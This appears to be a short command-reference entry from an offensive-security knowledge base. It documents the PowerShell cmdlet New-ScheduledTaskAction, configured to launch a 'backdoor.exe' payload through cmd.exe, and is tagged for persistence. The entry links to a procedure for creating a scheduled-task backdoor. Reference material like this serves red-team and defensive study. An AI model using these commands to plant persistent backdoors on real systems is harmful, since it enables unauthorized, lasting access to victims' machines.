---
type: command
executor: powershell
data: >-
  $A = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c
  C:\Users\Rasta\AppData\Local\Temp\backdoor.exe"
output: null
platforms:
  - Windows
tags:
  - persistence
  - scheduled-task
verified: true
validated: true
---

# powershell-new-scheduledtaskaction-cmd

## Command

```powershell
$A = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c C:\Users\Rasta\AppData\Local\Temp\backdoor.exe"
```

## Description

Creates a scheduled task action object to execute a payload via cmd.exe, part of building custom tasks.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -Execute "cmd.exe" | Program to run | Yes |
| -Argument "/c ..." | Arguments, e.g., run backdoor | Yes |

## Examples

### Basic Usage

```powershell
$A = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c C:\Temp\payload.exe"
```

## Expected Output

Returns a TaskAction object with the specified execute and argument properties.

## Related

- [[procedures/Create-Scheduled-Task-Backdoor-for-Persistence]]
- [[commands/powershell-new-scheduledtask-object]]
